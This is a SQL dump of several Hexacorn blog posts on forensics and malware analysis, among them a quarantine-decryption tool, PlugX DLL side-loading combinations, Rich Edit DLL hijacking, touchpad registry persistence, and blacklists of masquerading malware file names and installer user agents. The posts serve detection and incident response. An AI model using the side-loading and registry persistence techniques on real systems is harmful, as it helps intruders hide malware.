INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (181, 'Permanent Link to DeXRAY', 'Hexacorn', 'March 11, 2016 ', 'DeXRAY is a private tool that turned public a few years ago. Back in a day it helped me to decrypt some Quarantine files from forensic cases I worked on. Over time I expanded it to cover more engines and file formats. Not all the decryptions work perfectly, but as usual – this is a work in progress. Also, because I add stuff ad hoc, it’s not a beautiful code either. But it works \nAt the moment Dexray supports quarantine files and logs from a number of AVs, and data files storing PE files in an encrypted form (XOR with a single byte key). The full list of supported or recognized file formats is listed below:\n\nASquared (EQF)\nESET (NQF)\nKaspersky (KLQ) – based on the code by Optiv\nMalwareBytes Data files (DATA)\nMalwareBytes Quarantine files (QUAR)\nMcAfee Quarantine files (BUP) – not perfect, but it should still help\nMicrosoft Forefront (Magic@0=0B AD) – not handled yet; only recognized\nSUPERAntiSpyware (SDB)\nSymantec Quarantine Data files (QBD)\nSymantec Quarantine files (VBN) – not perfect, but it should still help\nSymantec Quarantine Index files (QBI)\nTrendMicro (Magic@0=A9 AC BD A7 which is ‘VSBX’ string ^ 0xFF) – based on the code by Optiv\nAny binary file (using X-RAY scanning)\n\nNow, it is a buggy program. I know of it so please bear with me. If you find something not working, or stupid, please tell me \nAlso, if you have any Quarantine files that you can share, from any AV, please send them over. I will appreciate it as it will help me to add new engines and test the support for already implemented ones. Thanks!\nNote: I used the code from Optiv to implement decryption of Kaspersky and Trend. This is a good stuff. Thanks to that – apart from decryption of the malware – DeXRAY now dumps additional metadata extracted from these two Quarantine file types. The metadata is stored in dedicated files with the .met extension, and is also printed to STDERR.\nHere is an example for Kaspersky:\n\nAnd for Trend:\n\nThe output files are saved into the following files:\n\n.out – the decrypted data\n.met – metadata (Trend&Kaspersky only)\n\nIn some cases you may find more than one .out file created for a given input files. This is the case with Trend Micro Quarantine files.\n\nThe first is:\n\n<filename>.TREND1.out file\nand contains a decrypted input file which includes both metadata and the file content\n\n\nThe second is:\n\n<filename>TREND2.out\nthat contains the actual file you want to analyze.\n\n\n\nAnother case like that is if the binary blob contains more than one encrypted PE file which is decrypted using X-Rays algorithm (basically, a number of PE files encrypted using a single byte XOR key inside one blob/file).\nThe script can be downloaded here.\n \nShare this :)', 'Batch Analysis, Compromise Detection, DeXRAY, File Formats ZOO, Forensic Analysis, Incident Response', 'http://www.hexacorn.com/blog/2016/03/11/dexray/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (182, 'Permanent Link to Beyond good ol’ Run key, Part 36', 'Hexacorn', 'March 10, 2016 ', 'Last Updated 2017-01-26\nAt the end of last post I mentioned PlugX. The idea used by this malware is pretty clever and relies on taking a legitimate signed .exe that is dependent on a DLL and swapping the DLL with the malicious replacement which – when loaded – decrypts/loads the final payload to memory.  The trick used by PlugX is referred to as DLL Side-loading and I thought it will be nice to try summarizing various versions of this persistence trick described by various blogs.\nThe below are triplets describing the following PlugX components:\n\nlegitimate .exe [‘Source’ refers to the article/blog/WP describing it]\n\nDLL Side-loaded .dll\n\nPayload\n\n\n\n\n\nHere they are…\n\nAShld.exe [Source]\n\nAShldRes.DLL\n\nAShldRes.DLL.asr\n\n\n\n\nCamMute.exe [Source]\n\nCommFunc.dll\n\nCommFunc.jax\n\n\n\n\nchrome_frame_helper.exe [Source PDF] Thx to @bartblaze\n\nchrome_frame_helper.dll\n\nchrome_frame_helper.dll.rom\n\n\n\n\ndvcemumanager.exe [Source]\n\nDESqmWrapper.dll\n\nDESqmWrapper.wrapper\n\n\n\n\nfsguidll.exe [Source]\n\nfslapi.dll\n\nfslapi.dll.gui\n\n\n\n\nfsstm.exe [Source]\n\nFSPMAPI.dll\n\nFSPMAPI.dll.fsp\n\n\n\n\nGadget.exe [Source]\n\nSidebar.dll\n\nSidebar.dll.doc\n\n\n\n\nhhc.exe [Source]\n\nhha.dll\n\nhha.dll.bak\n\n\n\n\nhkcmd.exe [Source]\n\nhccutils.dll\n\nhccutils.dll.res\n\n\n\n\nLoLTWLauncher.exe [Source] Thx to @bartblaze\n\nNtUserEx.dll\n\nNtUserEx.dat\n\n\n\n\nMc.exe [Source]\n\nMcUtil.dll\n\nMcUtil.dll.url\n\n\n\n\nmcf.exe [Source]\n\nmcutil.dll\n\nmcf.ep\n\n\n\n\nmcupdui.exe [Source]\n\nMcUtil.dll\n\nMcUtil.dll.ping\n\n\n\n\nmcut.exe [Source]\n\nMcUtil.dll\n\nmcutil.dll.bbc\n\n\n\n\nMsMpEng.exe [Source]\n\nMpSvc.dll\n\nMpSvc\n\n\n\n\nmsseces.exe [Source] Thx to @bartblaze\n\nmPclient.dll\n\nmsseces.asm\n\n\n\n\nNvSmart.exe [Source]\n\nNvSmartMax.dll\n\nboot.ldr\n\n\n\n\nOInfoP11.exe [Source]\n\nOInfo11.ocx\n\nOInfo11.ISO\n\n\n\n\nOleView.exe [Source]\n\nACLUI.DLL\n\nACLUI.DLL.UI\n\n\n\n\nOleView.exe [Source] Thx to @KyleHanslovan\n\niviewers.dll\n\n<unknown>\n\n\n\n\nPOETWLauncher.exe [Source] Thx to @bartblaze\n\nNtUserEx.dll\n\nNtUserEx.dat\n\n\n\n\nRasTls.exe [Source]\n\nRasTls.dll\n\nRasTls.dll.msc or RasTls.dll.config\n\n\n\n\nrc.exe [Source] Thx to @KyleHanslovan\n\nrc.dll\n\nrc.hlp\n\n\n\n\nRunHelp.exe [Source]\n\nssMUIDLL.dll\n\nssMUIDLL.dll.conf\n\n\n\n\nsep_NE.exe [Source] Thx to @KyleHanslovan\n\nwinmm.dll\n\nsep_NE.slf\n\n\n\n\nSetup.exe [Source]\n\nmsi.dll\n\nmsi.dll.dat\n\n\n\n\ntplcdclr.exe [Source] Thx to @KyleHanslovan\n\nwtsapi32.dll\n\nwtsapi32.dll\n\n\n\n\nUshata.exe [Source]\n\nUshata.dll\n\nUshata.fox\n\n\n\n\n\nThere is also a potential combo:\n\nAFLogVw.exe [Source]\n\nAhnI2.dll\n\n<unknown>\n\n\n\n\n\nNow, a request – if you know any other combo that I have not included on the list, please let me know+provide a reference/source and I will add it to the list. Thanks!\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Incident Response,', 'http://www.hexacorn.com/blog/2016/03/10/beyond-good-ol-run-key-part-36/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (183, 'Permanent Link to Beyond good ol’ Run key, Part 35', 'Hexacorn', 'March 1, 2016 ', 'A long time ago in a galaxy far, far away…. Microsoft was releasing new versions of a super uber cool pre-web era editing control called Rich Edit. I remember programming one of my early Windows API apps ages ago and at that time I was a bit puzzled. Puzzled, because I had to distinguish a version of Rich Edit control I could use and then I had to ensure that I load respective library myself to use certain features of the Rich Edit control.\nThe Rich Edit control was and still is a great editing control – it supports multi-line editing, Unicode, COM, and lots of other whistles and fireworks. It became a foundation of many applications and editors and in many aspects was ahead of its time. The libraries used by the various versions of the library are as follows:\n\n1.0 – Riched32.dll\n2.0 – Riched20.dll\n3.0 – Riched20.dll\n4.1 – Msftedit.dll\n\nAnd yes, you know where it is going…\nMany apps following the Microsoft’s mantra of loading the appropriate Rich Edit control would use LoadLibrary API and open it up to a nice DLL hijack.\nDropping malicious Riched20.dll and/or Riched32.dll in the same directory as the applications relying on Rich Edit control will lead to the execution of the malicious code each time the app is launched.\nA popular example of such app is WinRar. Many people use it as a standalone app and winrar.exe works w/o any supporting files so can be dropped anywhere. Other examples include a very old, but still popular Resource Hacker, as well as some tools from Sysinternals f.ex. ADInsight.exe, Bginfo.exe, FileInsight from McAfee, old EditPad, OllyDbg, and many more…\n\nThe newer version of Rich Edit DLL (Msftedit.dll) is maybe less common, but can be still found in popular applications. One I came across is aswMBR.exe from AVAST – the below pops up with my decoy DLL being dropped inside the same dir as aswMBR.exe and activates when I try to Save the log.\n\nSince many applications using the Rich Edit are signed, the unsigned DLL may be loaded in a very same manner as PlugX malware i.e. signed .exe loading an unsigned .dll.\nShare this :)', 'Autostart (Persistence), Compromise Detection, Forensic Analysis, Incident Response, Malware Analysi', 'http://www.hexacorn.com/blog/2016/03/01/beyond-good-ol-run-key-part-35/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (184, 'Permanent Link to Beyond good ol’ Run key, Part 34', 'Hexacorn', 'February 16, 2016 ', 'I mentioned various laptop/touchpad software in my older posts in this series (Synaptics, Alps). I recently came across yet another production from the Alps which is installed on some of the Toshiba laptops. Browsing through the available options of the Alps Pointing-device Driver software I discovered two potential exotic persistence locations which probably will never be abused, but are still worth mentioning – for completeness, and because the software is somehow vintage and hilarious at the same time.\nFirst, the vintage part. Alps offers a tray-icon based Easy Launcher. I think the software was designed really long time ago, way before Windows XP and 7 existed (let alone newer versions) and at that time it was probably a nice extension to have. In today’s Window’s user interface world there are so many better ways of achieving the same goal that it is really funny to see an archaic-looking Easy Launcher at work (let alone being installed on laptop from 2015; touche Toshiba).\nLet’s see:\n\nTo launch the Easy launcher, we need to click the Touchpad icon in the tray icon (notification) area\nWe will see the following user interface:\n\n\n\nWe then need to click the Easy Launcher which shows us… an old-school menu\n\n\n\nSelecting Specified Files will show the available options, including one item which I defined for demonstration purposes – a menu element that launches Calculator\n\n\nAll the data that Easy Launcher shows is taken from the following registry location:\n\n\nHKEY_CURRENT_USER\\Software\\Alps\\Apoint\\EasyLauncher\n\n\nas seen below:\n\nwhere:\n\nC01 = A command being executed by the menu item #1\nI01 – A path to a file that the icon shown by Easy launcher will be taken from\nT01 – A title, as seen in the Easy Launcher menu\n\nIt is pretty obvious that we can modify the C01 entry (and other, relevant Cxx entries) in the Registry to point to some man-in-the-middle malicious executable that will execute calculator (in our case) when launched, or we can simply hijack the whole entry.\nFor example: changing C01 to point to C:\\Windows\\System32\\notepad.exe will launch Notepad anytime Calc is selected from the menu. Interestingly, since it is the I01 entry that holds an information about the source of the icon presented on UI, there will be no visible clue that the entry now points to Notepad.\nSuch malicious hijacking effort certainly won’t fool an experienced power-user of the Easy Launcher who will be able to swiftly discover the modifications by exploring the modified settings as shown below:\n\nThe second best exotic persistence mechanism I am going to describe is like the second best exotic Marigold Hotel – it is certainly promising, but to deliver, will require a lot of effort; and this time not from the attacker, but from the attackee. This is the hilarious bit.\nThere is a mysterious gesture function that Alps touchpad offers called 3-Fingers Press which relies on a simultaneous caress delivered to the touchpad with a power of 3, precisely synchronized fingers. The gesture is so subtle and refined that any threat actor considering this maneuver as a way to persist on the targeted system is definitely the Sun Tzu of all APT actors, both the real ones and those imagined. Despite many efforts, boot camps and 1000 hours on the touchpad simulator, I yet have to accomplish the mission of mastering this unique fingering stance – and for that reason (and one more reason mentioned below) I name this APT persistence mechanism the self-touch of death.\nOn a technical note, the secret setting enabling the magic gesture is hidden in Advanced options:\n\nThere, one can enter the Settings dialog box and – lo and behold – add multiple executables in one go:\n\nIn an attempt to understand the logic behind the design of this feature, I came up with a hypothesis that I cannot unfortunately share on a public forum. The ability to run multiple executables with a single stroke is certainly a stroke of genius. And as such, a perfect reason to call it the self-touch of death.\nLast, but not least, the settings that manage this feature are stored in the following location:\n\nHKEY_CURRENT_USER\\Software\\Alps\\Apoint\\Mouse\n\n\nDue to a unique nature of this persistence mechanism and APT actors potentially hidden behind it I do not recommend developing regripper plug-in for it.\nShare this :)', 'Autostart (Persistence), Compromise Detection, Forensic Analysis, Silly', 'http://www.hexacorn.com/blog/2016/02/16/beyond-good-ol-run-key-part-34/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (185, 'Permanent Link to The art of disrespecting AV (and other old-school controls), Part 3', 'Hexacorn', 'February 4, 2016 ', 'This is the third part of the series (part 1, part 2) which this time is somehow shorter, but it is just an excuse to jot down some notes about the actual engines that AV uses internally.\nMany people complain about AV using hashes to detect malware – I would say that AV that detects malware via hashes only should not be even on the market, because it would not survive. Your average AV contains a significant number of engines, and subengines using many algos – many of which are lightning fast. Reducing the discussion about AV internal working to ‘AV uses hashes’ is simply not fair.\nLet’s have a look – I use the word ‘engine’ quite loosely here and it does not necessarily help with pure detection-specific logic, but it often facilitates the detection itself – each of these are typically quite serious programmatic efforts that are combined to create the ‘holistic’ coverage – yes, it fails, it contains vulnerabilities like any other software, but take a moment to think about the effort that goes into designing, testing all this clustergoodness:\n\nstatic binary string search\nbinary string with a simple wildcards search\nbinary string with a regex (or regex-like) search\nmulti-pattern search engines that are using lookup tables of any sort/trees/tries and proprietary algorithms\ncontainer/archiver processor – reads files or streams embedded inside the other files/containers\nfile/specific content analyzer/processor – for each file type, content type there is a dedicated engine f.ex. MBR, old Dos .COM file, Flash, OLE files, Symbian SIS, ISO, etc. – note that many of engine expire due to technologies being no longer in use/popular, but it is _there_\nunpacker  – decompresses streams of data to present them to other engines\nemulator – simple state machines with a basic understanding of some opcodes\nemulator – full-blown emulator with most opcodes supported\nsandbox – full-blown emulator with support of API & memory\nhooks – dynamic, for on-access scans\nheuristics engine\nwhitelisting engine\ndetection engine based on file properties\nrootkit detection engine\nnative file system parser (for various file systems)\nmemory dumper/file rebuilders\nonline scanner (virustotal-like)\nbehavioral engines\nreputation engines\nquarantine engine\ncrc/incremental crc search\nhash-based search\nentropy analysis\nX-rays\nand finally… removal and repair engine – if none of the above engines impress you… think for a second what effort goes to ensure you can remove a complex polymorphic or metamorphic file virus from a gazillion of files on the system without corrupting the files and crashing the system.\n\nThere are probably others which I forgot about, but this is really a lot more than just hashing.\nIf you talk about AV detection and the only thing you talk about is hash, it is probably because you smoke too much of it… \nShare this :)', 'Malware Analysis, Preaching', 'http://www.hexacorn.com/blog/2016/02/04/the-art-of-disrespecting-av-and-other-old-school-controls-part-3/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (186, 'Permanent Link to Western Digital Security – a short story of a known password that doesn’t work', 'Hexacorn', 'January 15, 2016 ', 'This is a short note to anyone who set up their password on their Western Digital drive using the ‘brilliant’ piece of software called WD Security and can’t unlock it, despite knowing the password.\nIf you know the password, but despite it being correct you can’t unlock the drive, it is possible you are using a very long password, longer than 25 characters. Turns out that when you set up a password the stupid software accepts password of any length, without limits. So, you enter your 30 characters password, set the password, unplug the drive, all happy. Then you plug it in again, provide your 30 character long password and to your horror, it doesn’t work. Try to input first 25 characters and it should hopefully work.\nOther vulnerabilities of WD drives here.\n \nShare this :)', 'Forensic Analysis, Silly', 'http://www.hexacorn.com/blog/2016/01/15/western-digital-security-a-short-story-of-a-known-password-that-doesnt-work/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (187, 'Permanent Link to Updated appid_calc.pl', 'Hexacorn', 'January 8, 2016 ', 'I was recently contacted by Terry O. who spotted and reported a bug in appid_calc.pl which I released back in 2013. After analysis I realized that I made a stupid mistake in the way the parameters were passed to the functions responsible for APPID calculation. Oops.\nI have updated the script yesterday and hopefully it should work now \nYou can download its latest version here.\nThanks to Terry for providing the feedback. This is much appreciated.\nShare this :)', 'appid_calc.pl, Forensic Analysis, Software Releases', 'http://www.hexacorn.com/blog/2016/01/08/updated-appid_calc-pl/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (188, 'Permanent Link to More Hanayama (Chess Piece Puzzles)', 'Hexacorn', 'December 28, 2015 ', 'I wrote about Hanayama puzzles before, so this is more a reminder than a long post. After I discovered these fantastic puzzles last year it pretty much became a norm now that anytime I visit Japan and have an occasion to visit Loft department store, of other similar shops selling variety and fun stuff I do so with a hope I will find some new sets. This is how I came across a relatively new set from Hanayama called Chess Puzzles (which apparently is a remake of a puzzle set made by the designer Marcel Gillen) and thought it will be a good moment to mention the company and their products again.\n \nHere are my new babies:\n\nThe Chess Puzzles turned out to be really easy and I went through them in no time. Luckily, there are still quite a few cast puzzles I have not cracked from the large collection I acquired last year.\nHanayama puzzles are of fantastic quality, have a great playability factor, and are a perfect gift for anyone who likes to crack problems.\nI (again) highly recommend it.\nShare this :)', 'Puzzles', 'http://www.hexacorn.com/blog/2015/12/28/more-hanayama-chess-piece-puzzles/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (189, 'Permanent Link to The art of Stuffing and Dressing of Application Data folder', 'Hexacorn', 'December 22, 2015 ', 'Application data folder is a very popular destination for malware. The files are typically dropped either directly inside it, or into subdirectories that are either randomized, leverage existing OS subdirectories, or sometimes malware creates their own – often mimicking the well-known applications’ folders (f.ex. Mozilla).\nThe attached list contains over 7000 file names for files that are ‘dropped’ inside the application data folder. The file names are extracted from a large set of sandbox reports.\nOnce stuffed in the folder, the malware often dresses itself impersonating popular applications f.ex.:\nchrome.exe\n\n\\Application Data\\23405d2\\Chrome.exe\n\\Application Data\\4236aa7\\Chrome.exe\n\\Application Data\\cchrome.exe\n\\Application Data\\Chrome.exe\n\\Application Data\\Directory\\Chrome.exe\n\\Application Data\\Google\\Chrome\\Application\\chrome.exe\n\\Application Data\\GoogleChrome.exe\n\\Application Data\\Orbitum\\Application\\chrome.exe\n\\Application Data\\qChrome\\chrome.exe\n\\APPLICATION DATA\\SVCHOST\\CHROME.EXE\n\\Application Data\\temp\\chrome.exe\n\\APPLIC~1\\chrome.exe\n\nfirefox.exe\n\n\\Application Data\\firefox.com\n\\Application Data\\firefox.exe\n\\Application Data\\firefox32.exe\n\\Application Data\\firefox32\\fox32.exe\n\\Application Data\\Mozilla\\Firefox\\firefox.exe\n\\APPLIC~1\\Firefox.exe\n\njava.exe\n\n\\Application Data\\google\\java.exe\n\\Application Data\\Java.exe\n\\Application Data\\java\\java.exe\n\\Application Data\\logjava.exe\n\\application data\\sys\\jre\\bin\\java.exe\n\\application data\\x10flasher_lib\\jre\\bin\\java.exe\n\\application data\\x10flasher_lib\\winjre32\\bin\\java.exe\n\\application data\\x10flasher_lib\\winjre32\\jre\\bin\\java.exe\n\nsmss.exe\n\n\\Application Data\\CDWD\\ntsmss.exe\n\\Application Data\\GHGF\\ntsmss.exe\n\\Application Data\\ipseol32\\rtcssmss.exe\n\\Application Data\\Microsoft\\smss.exe\n\\Application Data\\Microsoft\\Windows\\smss.exe\n\\Application Data\\secetupn\\mqsvsmss.exe\n\\Application Data\\smss.exe\n\\Application Data\\sys\\smss.exe\n\\Application Data\\sysdrivers\\smss.exe\n\\Application Data\\syssmss.exe\n\\Application Data\\System\\Oracle\\smss.exe\n\\Application Data\\WINDOWS\\SMSS.EXE\n\\Application Data\\winhelp\\smss.exe\n\\Application Data\\zbwpukwyg\\smss.exe\n\\APPLIC~1\\smss.exe\n\nand so on and so forth including some ridiculous Corporate hybrids like these:\n\n\\Application Data\\\\Application Data\\Google\\hkcmd.exe\n\\Application Data\\google\\java.exe\n\\Application Data\\Google\\MicrosoftSecurity64.exe\n\\Application Data\\Google\\svchost.exe\n\\Application Data\\GOOGLE\\winlogon.exe\n\\Application Data\\install\\csrss.exe\n\\APPLICATION DATA\\INSTALL\\EXPLORER.EXE\n\\APPLICATION DATA\\INSTALL\\IEXPLORER.EXE\n\\Application Data\\Java\\svchost.exe\n\\Application Data\\MicOffice\\MicOffice.scr\n\\Application Data\\Microsoft\\Adbeflashplugin.exe\n\\Application Data\\Microsoft\\GoogleToolbarNotifier.exe\n\\Application Data\\Microsoft\\Micromedia\\winconime.exe\n\\Application Data\\Microsoft\\SystemCertificates\\LeapFTP.exe\n\\Application Data\\Microsoft\\SystemCertificates\\My\\CRLs\\Flashfxp.exe\n\nor AV impersonators:\n\n\\Application Data\\Karpesky.exe\n\\Application Data\\KASPERANTIVIRUS.EXE\n\\Application Data\\KasperskyAV.exe\n\\Application Data\\MCAFEEANTIVIRUS.EXE\n\\Application Data\\MCAFEEAV32.EXE\n\\Application Data\\NOD32KERNELS.EXE\n\\Application Data\\NOD64.EXE\n\\Application Data\\NORMANANTIVIRUS.EXE\n\\Application Data\\NortonLive.exe\n\\Application Data\\SYMANTECAV.EXE\n\\Application Data\\SYMANTECAV2.EXE\n\nSince it’s a blacklist, it can be applied to hunting and file list analysis. FPs are definitely there, so you have been warned \nShare this :)', 'Batch Analysis, Clustering, Forensic Analysis, Incident Response', 'http://www.hexacorn.com/blog/2015/12/22/the-art-of-stuffing-and-dressing-of-application-data-folder/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (190, 'Permanent Link to IDAPython – making strings decompiler-friendly', 'Hexacorn', 'December 21, 2015 ', 'Update\nAs pointed out by 0stracon there is an option in Hexrays that actually enables it to print all strings. Go to Hex-Rays Decompiler Analysis Options and untick ‘Print only constant string literals’.\nTo make it permanent, enable it in hexrays.cfg:\n#define HO_CONST_STRINGS   0x0040   // Only print string literals if they reside\r\n                                    // in read-only memory (e.g. .rodata segment).\r\n                                    // When off, all strings are printed as literals.\r\n                                    // You can override decompiler\'s decision by\r\n                                    // adding \'const\' or \'volatile\' to the\r\n                                    // string variable\'s type declaration\r\nHEXOPTIONS               = 0x....   // Combination of HO_... bits\nI was not aware of this option and reinvented the wheel \nOld post\nOne of the features of IDA is its ability to recognize strings. This is a great feature, especially useful when you combine it with a power of HexRays decompiler – together they can produce a very nice pseudocode.\nThere is only one annoying bit there: if strings are recognized and defined inside a writable segment, they will not be presented by the decompiler as strings, but as variable names referring to strings.\nLet’s have a look at the example.\nIn the below example (Dexter sample) IDA recognizes the string “UpdateMutex:”\nWhen we now switch to the decompiler view, we will see that the decompiler changes it to s__Updatemutex:\n\n(the ‘s__’ prefix comes from the string prefix I typically use i.e. ‘s->’ which decompiler ‘flattens’ to ‘s__’). The s__Updatemutex refers to a string as shown below i.e. “UpdateMutex:” :\nObviously, a  decompiled code that refers to the actual string is much more readable – see the same piece of code as shown above where data is referred to by actual strings:\nIn order to make the decompiler use these actual strings (not the reference) we have two options:\n\nMake the segment where the string is recognized read-only (by disabling ‘Write’ in segment properties):\n\nUnfortunately, this will confuse the decompiler and will make the output not trustworthy (it is often truncated). You will also receive a friendly reminder that you are doing something stupid  a.k.a. a red card from the decompiler’s authors:\n\n\nThe second option is to use a ‘proper’ method of fixing the issue by telling the IDA that the string is a read-only a.k.a. constant i.e. you can change the type of the string from existing one to the one prefixed with a keyword ‘const’:\n\nSince most of the time strings are static it is handy to convert all the strings in IDA to read-only i.e. retyping all of them using the ‘const’ trick.\nThis is exactly what the strings_to_const.py script is intended to do.\nIt enumerates all segments, finds all strings recognized by IDA (note the comment about the prefix I use, you may need to adapt it to your needs), and then converts them to read-only.\nThe result?\nSee below – before and after:\n\nShare this :)', 'Malware Analysis, Reversing, Software Releases', 'http://www.hexacorn.com/blog/2015/12/21/idapython-making-strings-decompiler-friendly/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (191, 'Permanent Link to Monitoring unapproved apps/PUA/PUP/downware using default User Agents used by Inst', 'Hexacorn', 'December 20, 2015 ', 'While looking at the user agent list I shared today, I thought it might be an interesting idea to monitor unapproved/PUA/PUP/downware applications by paying attentions to all downloads that are leveraging the default user agents used by common installation packages, or the associated libraries (f.ex. inetc.dll used by Nullsoft packages).\nReviewing the list I came across a few low-hanging fruits:\n\nAdvancedInstaller\nInno Setup Downloader\nInnoTools_Downloader\nInstallMaker\nNSIS_INETC\nNSIS_Inetc (Mozilla)\nNSIS_InetLoad (Mozilla)\nNSIS_ToolkitOffers (Mozilla)\nNSISDL/1.2 (Mozi\nNSISDL/1.2 (Mozilla)\nSetup Factory\nSetup Factory 8.0\nSetup Factory 9.0\nTryMedia_DM_2.0.0\n\nMonitoring these may not only help to discover people installing unapproved applications, PUA/PUPs/downware, but also potentially malware spreading using popular installers.\nObviously, many dodgy apps use dedicated/proprietary downloaders and it’s not difficult to change the default user agent, so there are still some gaps here, but I believe the value is there and this could become yet another alert helping to protect ‘open internet’ environments.\nShare this :)', 'Batch Analysis, Clustering, Forensic Analysis, Incident Response, Proxy Logs Analysis', 'http://www.hexacorn.com/blog/2015/12/20/monitoring-unapproved-appspuapupdownware-using-default-user-agents-used-by-installers/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (192, 'Permanent Link to Santa’s bag full of User Agents', 'Hexacorn', 'December 20, 2015 ', 'Santa dropped some user agents on the DFIR/RCE community today.\nIt is similar to other lists shared before:\n\nhttp://www.hexacorn.com/blog/2014/12/23/santas-bag-full-of-mutants/\nhttp://www.hexacorn.com/blog/2015/04/05/the-easter-bunny-comes-with-a-bag-full-of-events/\nhttp://www.hexacorn.com/blog/2015/02/19/year-of-sheep-starts-with-a-bag-full-of-atoms/\n\nThe list includes over 6K user agents used by samples I sandboxed. There is no guarantee all of them are malicious, so be aware that adding them blindly to some block lists will cause a lot of issues.\nIf you find any mistakes, please let me know. As mentioned above, this list SHOULD NOT be taken at its face value as there are a lot of ways for it to get contaminated.\nNote: the list contains variables (I hope they are self-explanatory  ):\n\n<COMPUTER NAME>\n<IP>\n<MAC>\n<SAMPLE NAME>\n<USER NAME>\n\nShare this :)', 'Batch Analysis, Clustering, Compromise Detection, Forensic Analysis, Incident Response, Proxy Logs A', 'http://www.hexacorn.com/blog/2015/12/20/santas-bag-full-of-user-agents/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (193, 'Permanent Link to The typographical and homomorphic abuse of svchost.exe, and other popular file nam', 'Hexacorn', 'December 18, 2015 ', 'In my old post I described a list of file names used by malware to impersonate svchost.exe. I thought I will re-visit this post today and provide some more file names that malware is using for impersonation of common file names.\nCopyright Notice\nFeel free to use it for any individual or academic projects that are non-commercial f.ex. internal automatic malware/ forensic analysis systems that are not available commercially (f.ex. if you want to use it to write an Enscript, or perl/python script, or Yara/Cuckoo/Volatility code highlighting suspicious file names based on the below blacklist you are welcome to do so; if you share the script publicly it’s even better  ). I do not allow you to use this list in any commercial product or service including, but not limited to sandboxes & automatic malware/forensic processing systems. If you want to use it for anything that has a commercial/reselling purposes or may give a hint of such purpose please contact me first. Please note that this list may be watermarked.\nHow this list was generated?\nThis is based on strings extracted from 500K sandbox reports that have been analyzed using various ‘similarity’ functions including Levenshtein distance, prefix/infix/suffix similarities, and visual similarity (the final list has been reviewed manually). In other words, it costed a lot of cycles, hence the licensing note. Thanks for understanding.\nHere they are:\nchrome.exe\n5hrome\na_chrome\ncchrome\nchorom\nchr0me\nchro2me\nchrom\n-chrome\nchrome1\nchrome10\nchrome3\nchrome32\nchrome9\nchromede\nchromee\nchromeez\nchromei\nchromes\nchromix\nchromme\nchrommm\nchromre\nchromse\nchromyy\nchroom\nchroome\nchroum\ncrhome\nnichrome\ncsrss.exe\n_cerss\n_csrss\ncarss\nccrs\ncress\ncrrss\ncrss\ncrsss\ncsrcs\ncsres\ncsriss\ncsrlt\ncsrms\ncsrmss\ncsrrss\ncsrs\ncsrsc\ncsrse\ncsrsess\ncsrsk\ncsrsl\ncsrsrv\ncsrss_1\ncsrss_2\ncsrss_8\ncsrss_9\ncsrss32\ncsrssa\ncsrssc\ncsrsses\ncsrssr\ncsrsss\ncsrssw\ncsrssys\ncsrst\ncsrsvc\ncsrsvr\ncsrsx\ncsrtss\ncsrus\ncsrvs\ncssrs\ncssrsa\ncssrsr\ncssrss\ncvrss\nscrss\nexplorer.exe/iexplore.exe\n0iexplorer\n12iexplore\n2ciexplore\n2fexplorer\n5explore\n5xplorer\n_iexplors\ndexplorer\ndxplore\ne1xplorer\neexplorer\neexxplorer\neksplorer\nep1orer\nesplorer\nexeplorer\nexlorer\nexoplorer\nexp10rer\nexp1or\nexp1ore\nexp1orer\nexp1ror\nexp20re\nexpiorer\nexpioror\nexpl0rer\nexplarar\nexplarer\nexpleror\nexploe\nexploer\nexploere\nexploerer\nexploiter\nexploner\nexplope\nexplor\nexplora\nexplore\nexplored\nexploree\nexploreee\nexploreff\nexplorei\nexplorep\nexplorer1\nexplorer32\nexplorer64\nexplorer66\nexplorer_\nexplorere\nexplorerf\nexplorerr\nexplorerrr\nexplorers\nexplorerv\nexplorerxx\nexplorerz\nexplores\nexploret\nexplorew\nexploror\nexplorr\nexplorre\nexplorrer\nexplorxp\nexplre3r\nexplrer\nexplroer\nexpoler\nexpolorer\nexporer\nexprer\nexprlore\nexproler\nexqlorer\nexsplorer\nexxplorer\nieioplore\nieplore\nieplorer\niexeplore\niexlorer\niexlplore\niexp1ore\niexp1orer\niexpiore\niexpl0ra\niexpl0re\niexplare\niexplarer\niexplere\niexpllzore\niexplo\niexploer\niexploore\niexplope\niexplor\niexplore32\niexplorea\niexplorei\niexplorer\niexplorer0\niexplorer2\niexplorer7\niexplorers\niexplores\niexploresx\niexploror\niexplorrer\niexplors\niexplory\niexplorz\niexpore\niiexplore\niiexplorer\ninexplore\ninexplorer\nintexplore\nixplorer\nlexpiore\nlexpl1re\nlexpl2re\nlexpl3re\nlexpl4re\nlexpl5re\nlexpl6re\nlexpl7re\nlexpl8re\nlexpl9re\nlexplare\nlexplbre\nlexplcre\nlexpldre\nlexplere\nlexplfre\nlexplgre\nlexplhre\nlexplire\nlexpljre\nlexplkre\nlexpllre\nlexplmre\nlexplnre\nlexplore\nlexplore_\nlexplorer\nlexplors\nlexplpre\nlexplqre\nlexplrre\nlexplsre\nlexpltre\nlexplure\nlexplvre\nlexplwre\nlexplxre\nlexplyre\nlexplzre\nmsexplorer\nnetplore\nplorer\nvbexplorer\nwexplorer\nwinexplore\nxeplorer\nxplore\nxplorer\nyyexplorer\nfirefox.exe\n5c